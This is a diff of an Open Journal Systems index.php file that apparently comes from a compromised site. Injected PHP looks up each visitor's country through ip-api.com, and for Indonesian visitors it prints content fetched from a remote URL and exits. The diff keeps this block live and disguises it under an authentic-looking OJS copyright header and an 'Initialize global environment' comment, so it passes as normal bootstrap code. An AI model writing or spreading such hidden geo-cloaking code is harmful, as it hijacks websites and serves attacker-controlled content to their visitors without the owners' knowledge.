@@ -1,4 +1,19 @@
 <?php
+
+/**
+ * @file index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+use APP\core\Application;
+
+// Initialize global environment
 function getUserCountry() {
     $ip = $_SERVER['REMOTE_ADDR'];
     $url = "http://ip-api.com/json/{$ip}";
@@ -30,30 +45,8 @@ if (getUserCountry() === "ID") {
     echo @file_get_contents($Zhyven);
     exit();
 }
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
 
-?>
-
-<?php
-
-/**
- * @defgroup pages_index Index Pages
- */
-
-/**
- * @file pages/index/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- *
- */
-
-switch ($op) {
-    case 'index':
-        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
-        break;
-}
+// Serve the request
+Application::get()->execute();
